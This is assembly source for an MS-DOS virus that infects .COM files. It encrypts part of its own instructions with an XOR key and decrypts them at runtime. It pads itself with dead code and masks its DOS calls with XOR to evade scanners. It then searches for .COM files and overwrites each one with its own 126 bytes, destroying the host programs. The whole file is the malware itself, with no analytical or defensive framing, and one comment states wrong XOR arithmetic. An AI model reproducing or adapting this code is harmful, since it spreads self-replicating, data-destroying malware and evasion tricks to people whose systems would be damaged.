.model small
.code
FNAME EQU 9EH ;search-function file name result
    ORG 100H
START:
    ;; Decrypt instructions
    call enc_decrypt
    jmp REALSTART ; jump to the real start
    mov ax,03H ; insert some dummy instructions that are never executed
    xor cx,cx
    mov bx,ax
    xor bx,bx
    int 21H
    mov cx,bx
    push cx
    xor ax,ax
    mov dx,cx
    pop cx
    int 21H
    xor dx,dx
REALSTART:
    ;; This nonsense variable block will yield, 
    ;; after compilation and using XOR, 
    ;; the right instructions (actual instructions 
    ;; begin at 011DH)
    INSTR1 db 0fbH ;; mov ah,
    INSTR2 db 030H ;; 7fh
    INSTR3 db 0cfH ;; xor 
    INSTR4 db 0bbH ;; ah,
    INSTR5 db 07eH ;; 31h
    INSTR6 db 0f5H ;; mov dx,
    INSTR7 db 038H ;; offset
    INSTR8 db 04eH ;; COM_FILE
    INSTR9 db 082H ;; int
    INSTR10 db 06eH ;; 21h
    ;; encrypt the instructions back - we need them in the copies
    call enc_decrypt
SEARCH_LP:
    jc DONE
    mov ax,3D01H ;open file we found
    mov dx,FNAME
    int 21H
    xchg ax,bx ;write virus to file
    mov ah,12H
    xor ah,52H ; apply mask -> 12H xor 52H = 40H
    mov cl,126 ;size of this virus
    mov dx,100H ;location of this virus
    int 21H
    mov ah,7EH
    xor ah,40h ; 7EH xor 40H = 3EH
    int 21H ;close file
    mov ah,0FH
    xor ah,40H ; 0FH xor 4FH = 4FH
    int 21H ;search for next file
    jmp SEARCH_LP
DONE:
    ret ;exit to DOS
enc_decrypt PROC
    ;; Quick and dirty way to decript 
    ;; our instructions - no loop
    push ax
    push bx
    mov bx,OFFSET KEY
    mov ah,[bx]
    mov al,[bx]
    mov bx,011Dh
    xor [bx],ax
    add bx,2
    xor [bx],ax
    add bx,2
    xor [bx],ax
    add bx,2
    xor [bx],ax
    add bx,2
    xor [bx],ax
    pop bx
    pop ax
    ret
ENDP
COM_FILE DB '*.COM',0 ;string for COM file search
KEY DB 4FH
    END START